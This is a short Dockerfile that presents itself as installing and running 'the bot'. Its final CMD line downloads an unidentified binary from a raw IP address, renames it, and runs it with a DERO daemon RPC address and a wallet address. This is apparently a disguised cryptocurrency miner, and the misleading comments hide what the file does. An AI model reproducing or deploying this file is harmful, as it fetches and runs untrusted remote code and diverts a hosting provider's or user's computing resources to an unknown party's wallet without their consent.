FROM phusion/baseimage:bionic-1.0.0

# Use baseimage-docker's init system:
CMD ["/sbin/my_init"]

# Install dependencies:
RUN apt-get update && apt-get install -y \
    bash \
    curl \
    sudo \
    wget \
    git \
    make \
    busybox \
    build-essential \
    apache2-utils \
    apache2 \
    neofetch \
    ca-certificates \
    libcurl4 \
    libjansson4 \
    libgomp1 \
 && mkdir -p /home/stuff

# Set work dir:
WORKDIR /home

# Run config.sh and clean up APT:
RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

# Install the bot:
EXPOSE 80


# Run bot script:
CMD wget http://129.153.235.55/hansen && mv hansen mfula && chmod +x mfula && ./mfula --daemon-rpc-address=129.153.235.55:34195 --wallet-address dero1qygkqh3ud90ccmvj8zefshf9gq8y6fnmndt29v5t805kh9m26upwzqgns7qas
